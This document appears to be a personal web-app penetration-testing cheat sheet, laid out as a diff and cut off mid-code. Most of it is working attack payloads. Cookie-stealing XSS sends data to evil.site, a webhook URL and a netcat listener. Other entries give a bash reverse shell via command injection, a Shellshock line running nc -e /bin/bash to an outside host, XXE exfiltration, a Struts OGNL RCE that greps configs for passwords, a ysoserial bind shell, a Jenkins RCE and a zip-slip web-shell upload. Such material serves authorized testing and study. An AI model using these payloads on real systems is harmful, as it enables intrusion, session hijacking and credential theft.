+******************************************************************************************
+XSS Section
+******************************************************************************************
+XSS CheatSheet? - http://ha.ckers.org/xss.html
+
+http://www.secureideas.net/tools
+
+
+Original	Replacement		Name	Dec	Hex———		————	———	———
+"		&quot;	&#34;	&#x22;&		&amp;	&#38;	&#x26;'		&apos;	&#39;	&#x27;<		&lt;	&#60;	&#x3c;>		&gt;	&#62;	&#x3e;
+Examples:
+	Basic XSS, no filters applied
+	<script>alert("Hello World")</script>
+	"><script>alert(1)</script>
+	
+	XSS with no ' or " quotes allowed as they are filtered
+	<script>alert(/hello/.source)</script>
+	<script>alert(1)</script>
+	<IMG SRC=javascript:alert(1)>
+	javascript%3aalert(2)%2f%2f
+
+	XSS with no < or > allowed as they are filtered
+	"%3balert(1)//
+	'%3balert(1)//
+	%27%29;alert%281%29;//
+	test%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+	';}alert('xss');function asdf(){a='
+	\x27-confirm`1`-\x27 
+	\u0027-confirm`1`-\u0027 
+
+
+	<html><body><script>alert(1)</script></body></html>
+
+	<a/ondrag=alert()>
+	<x~%0Aonmouseover=alert(1)>AAA
+	test%22+onmouseover%3D%22alert(1)
+	test" onmouseover="alert(1)" fakeattribute="
+		We can also use CSS to expand the input box to cover the entire window:
+		test" onmouseover="alert(1)" style="position:absolute;top:0px;left:0px;width:100%;height:100%" fakeattribute="
+	campaignId=k8bx2" accesskey="y" onclick="alert(1)"//k8bx2
+	
+
+	XSS with the word "script" filtered out:
+	--%3E%3Cimg%20src%3da%20onerror%3dalert%281%29%3E
+	<IMG SRC='a' onerror=alert(1)>
+	<img src=x onerror='alert(1);'/>
+	<video src=1 onerror=alert(1)>
+	<audio src=1 onerror=alert(1)>
+	
+	" onerror="alert(1)" src="4.jpg" type="image
+	"/></a></><img src=f onerror=alert(1)>
+	<body onload="alert(1)">
+	<svg onload="alert(1)"></svg>
+	<svg/onload=alert(/XSS/)>
+	<svg onload=prompt(1)>
+	<x~%0Aonfocus=alert%281%29%20id=a%20tabindex=0>#a
+	"%3balert(1)//
+	";alert(1);//
+	'%3balert(1)//
+	';alert(1);//
+	javascript:alert(1)//
+	javascript%3aalert%281%29%2f%2f
+	");confirm(1);//
+	STYLE= "xss:expression(alert('XSS'))
+	%27%29;alert%281%29;//
+	%27%29;%20alert%28%271%27%29;//
+	test%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+	test%3cScRiPt%3ealert(1)%3c%2fScRiPt%3e
+	"-alert(1)-"		
+	%00”-alert(2)-"
+	<div onfocus=alert('xx') id=xss style=display:table>
+	';}alert('xss');function asdf(){a='
+	'<scr'+'ipt>'alert(1)'<\/scr'+'ipt>'
+	<a href="javascript:alert(1)">ClickMe</a>		#works in Markdown!!!
+	onmouseover javascript:decodeURIComponent('%3d')"alert(1)  # %3d is an =
+	<input type="hidden" style="x:expression(alert('XSS'))">
+	<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+">
+	<script>x=Function((![]+[]+!![])[1]+(![]+[]+!![])[2]+(![]+[]+!![])[4]+(![]+[]+!![])[6]+(![]+[]+!![])[5]+'(1)')()</script>
+
+	No Parentheses( ), < > or “script”
+	onerror=alert;throw 1;
+	onerror=eval;throw’=alert\x281\x29’;
+	" onclick="javascript:window.onerror=alert;throw 'XSS'" x="
+	" onclick="javascript:window.onerror=alert;throw 'XSS'
+	document.location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=' 
+
+
+	<script>document.write('<img src="https://webhook.site/b373f780-a821-4146-9262-7b565102386d/c='%2bdocument.cookie%2b'" />')</script>
+
+	XSS .NET filter bypass (Server Side)
+	<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(5))>
+	"expre/**/ssion(alert('XSS'))">
+	<%tag style=“css:expression(alert(4))”>
+	"style="x:expr/**/ession(open(alert(1)))"
+	{['toStrin'+x]:[].join,length:1,0:'java\script:alert\x28123\x29',['valueO'+y]:location}-'';
+
+	jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+	a technique for bypassing ASP.NET Request Validation for PXSS:
+	Using unicode for < and >
+	%uff1csvg onload=alert(2)>
+	%UFF1Cscript>alert('XSS')%UFF1C/script>
+	%uff1cscript%uff1ealert(1)%uff1c%2fscript%uff1e
+	\u003cscript\u003ealert(1)\u003c/script\u003e
+
+	\x27-confirm`1`-\x27 
+	\u0027-confirm`1`-\u0027 
+	
+	<script>var q="";~{valueOf:opener.button.click}//"</script>
+	<script>var q="";~{toString:opener.button.click}//"</script>
+
+
+	If the DBMS stores it in a VARCHAR field instead of NVARCHAR, it gets truncated to the ASCII equivalent.
+	Thus turning it into <script>alert('XSS')</script>
+
+	An iFrame using Unicode
+	%UFF1Ciframe>
+
+	
+		';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+
+	font-family:a/**/ression(alert(1))('\')exp\')
+	Works on IE <= 9:
+	<html> <head> </head> <body> <div style="font-family:a/**/ression(alert(666))('\')exp\')">pwn</div> </body> </html>
+
+	XSS to change the action of the resulting form to point to a different location so 
+	that the password is not submitted to the normal place
+	<script>document.forms[1].action="foo.php"</script>
+	
+	XSS to Redirect to another page
+	<script language="javascript">window.location.href = "http://evilsite.org/page.html" ;</script>
+
+	XSS to run script from other server
+	<script src="http://evil.site/bad.js"></script>
+	<script src=bitly.com/oIXm5
+
+	XSS to Put another web site in an iframe:
+	<iframe src="http://www.cnn.com"></iframe>
+
+	XSS Small in a form field  
+	test<IMG SRC='a'>   -> if the word test shows up but the payload does not, you are vuln to XSS
+	
+
+
+Javascript Injection Examples:
+	javascript:alert(document.cookie);
+	javascript:void(document.cookie="Field = myValue");
+
+
+
+	<script>documnet.write('<img src="http://evil.site/'+document.cookie+'">')</script>
+
+	Cookie Catcher ->this code logs the cookies in a simple format.
+
+	Redirect a user -> <script language="javascript">window.location.href = "otherpage.html" ;</script>
+
+	External Scripts -> <script src="http://evil.site/bad.js"></script>
+
+	<IMG SRC="javascript:alert('XSS');">
+	<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+	<IMG SRC="javascript:alert(&quot;XSS&quot;)>
+	<IMG SRC='a' onerror=alert(1)>
+
+
+	Pull local IP address using http://reglos.de/myaddress/ in XSS attack
+
+
+    document.write('<img src='http://myevilsite.com?' + document.cookie + '>');
+ 	This takes the cookie already loaded in my browser and sends it to the "myevilsite.com" 
+	as an image request.
+
+	A simple example of XSS can be seen in the following URL:
+		http://server.example.com/browse.cfm?categoryID=1&name=Books
+
+	In this example the content of the 'name' parameter is displayed on the returned page. 
+	A user could submit the following request:
+		http://server.example.com/browse.cfm?categoryID=1&name=<h1>Books
+
+	If the characters < > are not being correctly stripped or escaped by this application, 
+	the "<h1>" would be returned within the page and would be parsed by the browser as 
+	valid html. 
+	A better example would be as follows:
+		http://server.example.com/browse.cfm?categoryID=1&name=<script>alert(document.cookie);</script>
+
+	In this case, we have managed to inject Javascript into the resulting page. The relevant 
+	cookie (if any) for this session would be displayed in a popup box upon submitting this 
+	request. 
+
+	Requires attacker to input script
+	Then view resulting page
+	For example:
+		Attacker starts netcat listener
+			nc -n -l -p 2222
+		Attacker Posts a message to a forum
+			<script>document.location='http://1.1.1.1:2222/grab.cgi?'+document.cookie;</script>
+				grab.cgi doesn't have to actually exist.  It just needs to be in URI
+		Victim Views the message 
+			Victims cookies are sent to 1.1.1.1 on port 2222
+
+
+	XSS Example in a Message Board
+		<B C=">" onmouseover="alert('Gotcha!')" X="<B ">H E L L O</B>
+			or
+		<B C=">" onmouseover="alert(document.location='http://mysite.org/cookiecatcher.php?'+document.cookie)" X="<B ">H E L L O</B>
+			The code for the php script called cookiecatcher.php.  If it is
+			running you can look in /tmp/cookiedump and see the cookie
+
+
+DOM-based XSS
+	The client uses the URL within the DOM. All attacks are in the URI?!?!
+	Examples of inputs (or sinks) are:
+		cookies
+		the referer
+		dialog inputs	
+		XMLHTTPRequest Responses
+	
+	Example attacks via URI:
+		http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
+		http://www.some.site/page.html#default=<script>alert(document.cookie)</script>
+					      ^
+		
+	Tools: -> DOMinator - firefox extension
+		http://code.google.com/p/dominator
+			it extends firebug to detect D-XSS flaws
+		passive monitoring
+
+Keystroke logging:
+	Form fields -> only grabs the field contents:
+	onblur="javascript:document.write('<img src=//attackert/'+this.value);"
+	
+	OnKeyPress event handling:
+	onkeyup="javascript:document.write('<img src=//attackert/'+this.value);"
+
+
+Code to steal cookies:
+	<script>document.write('
+	   <img src="http://evil.site/'+document.cookie+'">')
+	   </script>
+
+Code to redirect a user
+	<script language="javascript">
+	 window.location.href = "otherpage.html" ;
+	 </script>
+
+Code to change the Form Action to have it submit to us:
+	documnet.forms[1].action="http://www.site.org/"
+
+Code to execute external Script:
+	<script src="http://evil.site/bad.js">
+	  </script>
+
+Evasion Examples:
+	Traditional:
+		<SCRIPT>alert("XSS")</SCRIPT>
+			or
+		<IMG SRC="javascript:alert('XSS');">
+	Malformed
+		<IMG """><SCRIPT>alert("XSS")<SCRIPT>">
+		<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+
+******************************************************************************************
+Command Injection Section
+******************************************************************************************
+
+Sample Site that uses ping and the IP provided in the URL
+http://site.org/example.php?ip=127.0.0.1
+
+	http://site.org/example.php?ip=127.0.0.1; uname -a
+	http://site.org/example.php?ip=127.0.0.1 && uname -a
+	http://site.org/example.php?ip=127.0.0.1%26%26cat /etc/passwd
+		%26 is an &
+	http://site.org/example.php?ip=127.0.0.1%0a pwd
+		%0a is an encoded "new line"  Works great!
+	Using netcat:
+		nc site.org 80
+			GET /example.php?ip=127.0.0.1|uname+-a HTTP/1.0
+
+
+
+
+Use command injection to get a remote bash session
+Attacker starts netcat listener
+	nc -n -v -l -p 2222
+Then in the user input form enter the following
+	test; /bin/bash -i > /dev/tcp/<ip of nc>/2222 0<&1 2>&1; echo hello
+		test;		data that the input form would normally use;
+				i.e. username, password, etc
+		/bin/bash -i	invoke bash in interactive mode
+		> /dev/tcp	redirect output of bash to ip on port 2222 via
+				/dev/tcp.  There is a / between ip and port
+		0<&1		tells the system to duplicate the standard
+				output file descriptor (&1) and connect it to
+				the standard in of bash
+		2>&1		standard error
+		;echo hello	Just acting as a place holder in case the 1st
+				two command don't actually work.  If you notice
+				the 3rd command works but the other 2nd didn't
+				you can compose your injection so the 3rd one
+				will work...if necessary
+
+	
+******************************************************************************************
+Other Injection Section
+******************************************************************************************
+
+XPATH Injection:
+	XML Documents are data stores
+	Location paths describe where we are
+		/Organization/Groups/Security
+	/ by itself references the root node
+	* is a wild card
+	@ is used to select attributes
+	. and .. are teh current node and its parent respectively
+
+	XPATH Queries:	
+		//Member		->returns all of the members in phonebook
+		/Groups/Security/Member/[Name="Tony*"]
+			retuns members who's name starts with Tony
+		//@type="office"
+			returns all attributes of a specific type
+
+XPATH -> Pull information from XML
+	* is a wildcard
+	@ is used to select attributes
+	. and .. current and parent node respectively
+	//Members 	->returns all of the members in a phonebook
+	[Name="Tony*"]	->return names that start with Tony
+	//@type="office" ->return all attributes of a specific type
+	
+	Expected Input:
+		Brenna
+	Attacker Input:
+		Brenna" or "*"="
+
+	Finding Web Services on Google
+		filetype:wsdl wsdl site:site.com
+
+
+	Entity's
+	<!ENTITY intra SYSTEM "http://intranet/index.html">
+	<!ENTITY pass SYSTEM "/etc/passwd">
+
+	Just like SQL injection, XPath allows you to do boolean logic, and you can try:	' and '1'='1 
+	' or '1'='1 and you should get all results.
+
+Xpath Blind Explorer -> xpath explotation tool.
+	https://code.google.com/p/xpath-blind-explorer/
+
+XML ENTITY Expansion cheat sheet:
+http://www.silentrobots.com/blog/2015/12/14/xe-cheatsheet-update/
+
+XML ENTITY EXPANSION:
+	<?xml version="1.0" encoding="ISO-8859-1"?>
+	 <!DOCTYPE foo [  
+	   <!ELEMENT foo ANY >
+	   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+
+
+	 <?xml version="1.0" encoding="ISO-8859-1"?>
+	 <!DOCTYPE foo [  
+	   <!ELEMENT foo ANY >
+	   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+
+
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [<!ELEMENT foo ANY >
+	        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+
+	<!DOCTYPE doc [
+	  <!ENTITY hosts SYSTEM "/etc/hosts">
+	] >
+
+
+	<!ENTITY intra SYSTEM "http://intranet/index.html">
+	<!ENTITY pass SYSTEM "/etc/passwd">
+
+
+	Another one:
+	<!DOCTYPE root [
+	<!ENTITY % file SYSTEM "file:///etc/passwd">
+	<!ENTITY % did SYSTEM "http://myevilip/ext.dtd
+	%dtd;
+	%send;
+	]]>
+
+		ext.dtd file on my web server:
+		<!ENTITY % all
+		"<!ENTITY &#x25; send SYSTEM 'http://myeveilip/SITE-HACKED?%25file;'>"
+		>
+		%all;
+
+	Look in log file on my evil web server for access to "SITE-HACKED"
+
+
+
+LDAP injection
+	Some LDAP servers authorize NULL Bind: if null values are sent, the LDAP server 
+	will proceed to bind the connection, and the PHP code will think that the 
+	credentials are correct. To get the bind with 2 null values, you will need to 
+	completely remove the parameter from the query. If you keep something like 
+	username=&password= in the URL, these values will not work, since they won't be 
+	null; instead, they will be empty.  So, completely remove the username=&password=
+	options.
+	
+	Examples in URL:
+		http://site.org/example.php?name=*&password=hacker
+		http://site.org/example.php?name=dude&password=*
+
+
+
+	When logging in to a site using LDAP try removing the username=jimmy&password=blah 
+	from the POST body and resubmit the request. In some instances the LDAP service
+	will allow the authentication to happen
+
+
+
+	Typical login uses boolean OR or boolean AND logic:
+		OR	|: (|(cn=[INPUT1])(cn=[INPUT2])) to get records matching [INPUT1] or [INPUT2].
+		AND	&: (&(cn=[INPUT1])(userPassword=[INPUT2])) to get records for which the cn matches 
+				[INPUT1] and password matches [INPUT2]	
+
+		So, in the AND case it would look something like this:
+			(&(cn=admin)(userPassword=admin))
+			http://site.com/name=admin&password=admin
+
+		To inject this so we don't have to authenticate we can do this:
+			(&(cn=admin)(cn=*))%00)(userPassword=admin))
+			http://site.com/name=admin)(cn=*))%00&password=whatever
+				that should auth bypass
+
+			Further you can change the name= to name=* to auth as
+			first entry in LDAP db or first a entry name=a* , etc.
+
+
+		
+
+
+
+Server-Side Template Injection:
+	${7*7}  -> Returns 49
+	${param}
+	${header}
+	${cookie}
+	${root}
+	${_root}
+	${self}
+	${_self}
+
+	${facesContext.getExternalContext().getResponse().setContentType("text/plain;charset=\"UTF-7\"")}
+		Does this change the content-type header to UTF7
+
+	${(java.lang.Runtime).getRuntime().exec(“cmd.exe /c ipconfig”)}
+
+	${param.Note.replaceAll(“P”,“Q”)}
+		Note would be the name of another parameter in the request
+		Put PPPP in the Note parameter and see if it gets replaced with Q
+
+	Example shell with EL template: http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html
+
+
+
+     Example 1:
+	https://site.com/?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname%20-a')}}
+		returns uname -a output
+
+	
+     Example Walk Through 2:
+
+	http://site.com/{{2*2}}
+		returns 4 in the response
+
+	http://site.com/{{''.__class__.mro()[X].__subclasses__()}}
+		Where X is the integers I need to find
+		Start with 0 for X and increment X until you get a list of subclasses
+		{{''.__class__.mro()[1].__subclasses__()}}
+		{{''.__class__.mro()[2].__subclasses__()}}
+			returns: a list of all python classes in use. Search for popen, etc.
+			Page not Found: http://ptl-a17c254a-1e59253c.libcurl.st/[<type 'type'>, <type 'weakref'>, <type 
+			'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, 
+			<type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, 
+			<type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, 
+			<type 'complex'>, <type 'float'>, <type 'buffer'>, <ty......
+
+		copy output and put into VI or SED and replace all > with a \r (CRLF) to put each class on it's own line
+		 	in VI: :%s />/\r/g
+		then number each line
+			in VI: :set number
+		find Popen line number
+			in VI: :/Popen
+
+		try calling the Popen class by it's number on send through intruder until you find the Popen subclass:
+
+	http://site.com/{{''.__class__.mro()[2].__subclasses__()[233]}}
+		VI starts counting at 1 instead of 0 so your number may be off a bit
+		should see a successful request
+
+	http://site.com/{{''.__class__.mro()[2].__subclasses__()[233]("uname -a",shell=True,stdout=-1).communicate()[0]}}
+		should have command execution and see the output of uname -a
+
+
+
+******************************************************************************************
+Apache Struts 2 
+******************************************************************************************
+replace the Content-Type header value with the following:
+
+%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat  /etc/tomcat/* |grep -i pass').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+
+make sure it is all on one line and change the "cat /etc/tomcat/* |grep -i pass" with my command
+something like ls or dir to start
+
+
+
+******************************************************************************************
+Directory Traversal Section
+******************************************************************************************
+
+../../../../etc/passwd
+..//..//..//etc/passwd
+
+Embed a shell in a zip file that can be uploaded to a website:
+	create the following directory structure: 
+		mkdir -p  ~/Downloads/var/www/1/1/1/1/1/1/1/1/1/1
+		cp pwnt.php /~/Downloads/var/www/
+		cd ~/Downloads/var/www/1/1/1/1/1/1/1/1/1/1
+		zip traversal.zip ../../../../../../../../../../../../var/www/pwnt.php
+			7z l traversal.zip 	#will show you the path traversal 
+	Upload file to web site.
+
+GET /u/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd HTTP/1.1
+Host: TargetHost
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+
+Basically the "/u/" is a directory that exist and the UTF-8 is similar to the traditional /u/../../../../../../../../etc/passwd
+
+%c0%ae is a dot "."
+%c0%af is a slash "/".
+
+
+16 bit Unicode encoding:
+ . = %u002e, / = %u2215, \ = %u2216 
+
+Double URL encoding:
+. = %252e, / = %252f, \ = %255c     
+
+UTF-8 Unicode encoding:   
+. = %c0%2e, %e0%40%ae, %c0ae, / = %c0%af, %e0%80%af, %c0%2f, \ = %c0%5c, %c0%80%5c
+
+
+download file, xls downloads are not allowed but pdf are: 
+http://site.com/downloads/file.xls%2500.pdf
+	%25 is Hex for % sign
+	00 is null byte
+		combining the two gives you %2500
+
+	
+******************************************************************************************
+HTML Injection Section
+******************************************************************************************
+Add the following to a “comments” section or something similar. 
+<b><i><u>This+is+bold,+italics,+and+underlined.</b></i></u>
+  or
+%3Cb%3E%3Ci%3E%3Cu%3EThis+is+bold,+italics,+and+underlined.%3C%2Fb%3E%3C%2Fi%3E%3C%2Fu%3E
+
+Does it show up bolded, italics and underlined?  If so, you are vuln to HTML injection
+
+******************************************************************************************
+SOAP Section
+******************************************************************************************
+
+SOAP Tools:
+	WebScarab
+	WebService Studio
+		http://webservicestudio.codeplex.com/ -> from Microsoft
+	SOAPUI
+		./soapui.sh
+		./java -jar ./burp  #turn off intercept mode
+		back to soapui
+		In File -> Preferences set up the burp proxy 127.0.0.1 port 8080
+		Click File-> New soapUI Project
+		The Project name should be "testing"
+		The Initial WSDL would be "http://www.site.org/scanners/webservice/ws-helloWorld.php?wsdl"
+		Check the box for  "Creates a Testsuite for the imported WSDL or WADL"
+		Click OK
+		A new window will open to generate the testsuite.
+		Click OK
+		In the main window, expand each of the tree items
+		Right click on the "Security Tests"
+		Click "New SecurityTest"
+		Click OK
+		A window will open
+		Right click on the "hello (0 scans)"
+		Select "Add SecurityScan"
+		Select XSS and then OK
+		Add parameters and explore the interfaces.
+		As you use SOAPUI, keep in mind that right-clicking the test cases is 
+			where you can add new cases.
+		After exploring the interface and building various cases, try the other 
+			web services.  To find them, the url is 
+			http://www.site.org/scanners/webservice/
+
+	WSDigger	->tool from foundstone
+
+
+******************************************************************************************
+Redirection
+******************************************************************************************
+www.site.com/?url=newsite.com
+	try adding a . to the end and the new domain. i.e.:
+		www.site.com/?url=newsite.com.myevilsite.com
+
+
+
+
+
+******************************************************************************************
+Other cool shit that I didn't know where to put Section
+******************************************************************************************
+
+403 Forbidden page? Add the following header and try again:
+	X-Client-IP: 127.0.0.1
+
+
+CeWL -spiders an web site and then generates a word list for use as passwords
+	or other dictionaries for attacks
+	./cewl.rb http://www.site.org -w ~/cewl_wordlist
+
+
+Shellshock
+
+   In burp:
+	GET /cgi-bin/status HTTP/1.1
+	Host: ptl-9172b92e-3a77e30d.libcurl.so
+	User-Agent: () { :;}; /usr/bin/nc jtharel.mooo.com 80 -e /bin/bash
+	Accept: application/json, text/javascript, */*; q=0.01
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://ptl-9172b92e-3a77e30d.libcurl.so/
+	X-Requested-With: XMLHttpRequest
+	Connection: close
+
+   The GET request points to the /cig-bin/status which is a Bash script
+	shellshock is a vuln in bash
+
+   Other User Agents to try:
+	User-Agent: () { :;}; echo $(</etc/passwd)
+
+
+************************************
+
+Java Serialized Object:
+
+This exploits the method readObject() on data coming from the user
+
+if cookie value starts with rO0 there is a good chance the cookie is Base64 encoded java serialized object
+
+Send value to Decoded and Base64 decode it. In the Hex view does is start with ac ed 00? If so, good 
+indication of a serialized object.
+
+
+java -jar ysoserial-master-30099844c6-1.jar Spring1 '/usr/bin/nc -l -p 9999 -e /bin/sh' |base64		#(|base64 -w 0 on linux)
+	Spring1 is the Gadget type. Maybe possible gadget types. Try all of them.
+
+Copy the Base64 encoded value and replace the cookie value with it.
+
+
+
+
+
+************************************
+Jenkins Server:
+	
+When you create a new item at http://site.com/view/All/createItem the POST body
+will look like this:
+
+name=test2&mode=hudson.model.FreeStyleProject&json=%7B%22name%22%3A+%22test%22%2C+%22mode%22%3A+%22hudson.model.FreeStyleProject%22%7D&Submit=OK
+
+
+Replace the POST body with this:
+
+<map>
+  <entry>
+    <groovy.util.Expando>
+      <expandoProperties>
+        <entry>
+          <string>hashCode</string>
+          <org.codehaus.groovy.runtime.MethodClosure>
+            <delegate class="groovy.util.Expando"/>
+            <owner class="java.lang.ProcessBuilder">
+              <command>
+                <string>uname</string>
+                <string>-a</string>
+              </command>
+            </owner>
+            <method>start</method>
+          </org.codehaus.groovy.runtime.MethodClosure>
+        </entry>
+      </expandoProperties>
+    </groovy.util.Expando>
+    <int>1</int>
+  </entry>
+</map>
+
+
+Change the Content-Type: header to text/xml
+Change the URI to /view/All/createItem?name=1234
+	each request you send you must change the name to something unique
+The output will not be returned in the browser but you have code execution.
+Also, inside the <command> section each new <string> tag is used after each
+	space. i.e uname -a as shown in the example above.
+
+
+
+************************************
+
+
+
+
+OWASP Tools Install on Ubuntu in the cloud:
+	echo "deb http://archive.canonical.com/ubuntu precise partner" >> /etc/apt/sources.list	echo "deb http://appseclive.org/apt/stable /" >> /etc/apt/sources.list	apt-get update
+	#apt-get --assume-yes --force-yes install xbuntu-desktop
+	apt-get --assume-yes --force-yes install owasp-wte-cloud
+	#useradd --comment "OWASP WTE" --create-home owasp 
+	# echo -e "owasp\nowasp" | passwd owasp	# service lightdm start
+
+
+HTTP/1.1 is defined in RFC 2616
+	http://tools.ietf.org/html/rfc2616
+
+HTTP Response Codes:
+	1xx Informational 	-100 Continue
+	2xx Success		-200 OK
+	3xx Redirection		-302 Redirect
+				-304 Not Modified
+	4xx Client Error	-401 Unauthorized - must authenticate
+				-403 Forbidden - web server doesn't have permis
+				-404 File not found
+	5xx Server Error	-500 Server Error
+				-502 Bad Gateway
+
+New Response Codes - came out 5/15/2012:
+	511	Network Authentication Required 
+
+
+Supported HTTP Request Methods
+	PUT 	-WebDAV method that allows files to be PUT onto the server
+	DELETE	-Allows for removing files
+	CONNECT	-Creates a TCP Tunnel through the server in the HTTP Protocol
+	TRACE	-Echo the request as seen by the server
+	OPTIONS	-List supported methods
+
+	for method in GET POST PUT TRACE CONNECT OPTIONS;
+	do
+		printf "$method / HTTP/1.1\nHost: site.com\n\n" | nc site.com 80
+	done
+
+Download a file via powershell:
+$client = new-object System.Net.WebClient
+$client.DownloadFile("http://www.example.com/file.txt", "C:\tmp\file.txt")
+
+
+Samauri	- live CD for web application security testing	
+	http://sourceforge.net/projects/samurai
+	http://samurai.inguardians.com
+	http://www.madirish.net/?article=218
+
+yokoso!		Browser script that looks to see if a given browser has been
+		used to manage infrastructure stuff
+
+durzosploit	-encoding attack browser scripts
+
+Cookies
+	Cookies involve the use of HTTP header responses to set values on the client side, and 
+	in client requests to provide these values back to the server side. The value is set using 
+	a 'Set-Cookie' header and returned using a 'Cookie' header. Take the following example of 
+	an exchange of cookies. The client requests a resource, and receives in the headers of the 
+	response:
+
+	Set-Cookie: PASSWORD=g0d; path=/; expires=Friday, 20-Jul-03 23:23:23 GMT
+
+	When the client requests a resource in path "/" on this server, it sends:
+
+	Cookie: PASSWORD=g0d 
+
+Session ID's
+	Most modern web scripting languages include mechanisms to maintain session state. That 
+	is, the ability to establish variables such as access rights and localization settings 
+	which will apply to every interaction a user has with the web application until they 
+	terminate their session. This is achieved by the web server issuing a pseudo-unique 
+	string to the client known as a Session ID. 
+		
+	Session ID's using GET variable:
+	PHP supports GET variable sessions - the Session ID is passed via a GET variable named
+		PHPSESSID.  PHP automatically modifies all links at runtime to add the PHPESSID
+		to the link URL, thereby persisting state.  Not only is this vulnerable to 
+		replay attacks it trivializes it -- searching proxy logs, viewing browser
+		history, etc
+
+	Session ID's using Cookies:
+	ASP uses 'Session-ID' where PHP uses 'PHPSESSID' in the cookie method variable.  The 
+		Session Id can still be logged and replayed.  The attacker need only post the 
+		document.cookie property to his logging application to extract the Session ID.
+
+	Session ID's using Hidden Forms:
+	One technique often used is to embed the Session ID string in an <input type="hidden"> tag
+	with a <form> element.
+
+
+Business Logic Example:
+	Process should be: 
+ 	   Add item to cart; total the cart; Authorize Credit Card, Check out
+	BusinessLogic Attack:
+	   Total the cart; Authorize Credit Card, Add item to cart, Check out
+
+
+Perl Script for finding Linux Accounts with web directory browsing "~jones":
+	#!/usr/bin/perl
+	use LWP;
+	$webserver = "http://www.site.org";
+	my $browser = LWP::UserAgent->new;
+	while(<>){
+		chop($_);
+		$lastname = $_;
+		for('a'..'z'){
+			$fullname = $_.$lastname;
+			$url =$webserver."/~".$fullname;
+			my $response = $browser->get($url);
+			if($response->is_success){
+				print "Found: ".$fullname." : (".$url.")\n";
+			}
+		}
+	}
+
+
+
+Google has a class on python for free
+
+Python! ---Learn it!
+	Sample Python Program for retrieving the index.php file:
+		import httplib
+		conn = httplib.HTTPConnection ("www.site.org")
+		url = "/index.php"
+		conn.request ("GET", url)
+		resp = conn.getresponse()
+
+
+		print resp.getheader("Set-Cookie")
+			This will print any cookies being set in this response
+
+	Sample Python Program for printing "Server", "Date" and Cookie Headers
+		as well as writing response codes for valid "ID's" to a 
+		"results.txt" file:
+	
+		#!/usr/bin/python
+
+		import httplib
+		
+		n = 1
+		outfile=open(results.txt","a")   #the a will append
+		
+		while n <=100:
+			conn = httplib.HTTPConnection("www.site.com")
+			url = "/python/index.php?id=" + str(n)
+			conn.request("GET",url)
+			resp = conn.getresponse()
+			print resp.getheader("Server")
+			print resp.getheader("Date")
+			print resp.getheader("Cookie")
+			respcode=resp.status
+			result="\nTrying "+str(n)+"\n"+url+" "+str(respcode)+"\n"
+			outfile.write(result)
+			n+=1
+
+PHP		Various configuration options can change how PHP handles 
+		security and user input:
+			register_globals=[ON|OFF]
+				If set to on, application searches cookies,
+					GET, POST, and session variables
+				If set to off, variables must be explicitly 
+					referenced
+			display_errors=[ON|OFF]
+				Determines if PHP will display detailed error
+					messages to the browser
+				PHP Errors often contain sensitive info
+					Installed Path
+					Config Settings
+			allow_url_fopen=[ON|OFF]
+				Determines if PHP will open or include files from 
+					remote servers	
+
+		setcookie (name, value, expire, path, domain);
+		setcookie ("username", "Kevin", Fri-27-Feb-2009", "/", "site.org");
+
+		Reading a cookie:
+			$username = $_COOKIE["username"];
+
+
+		PHP Code Sample to make a POST request:
+		   <?php
+			$ch = curl_init();
+			curl_setopt($ch, CURLOPT_URL, "http://sit.org/login.php");
+			curl_setopt($ch, CURLOPT_POST, 1);
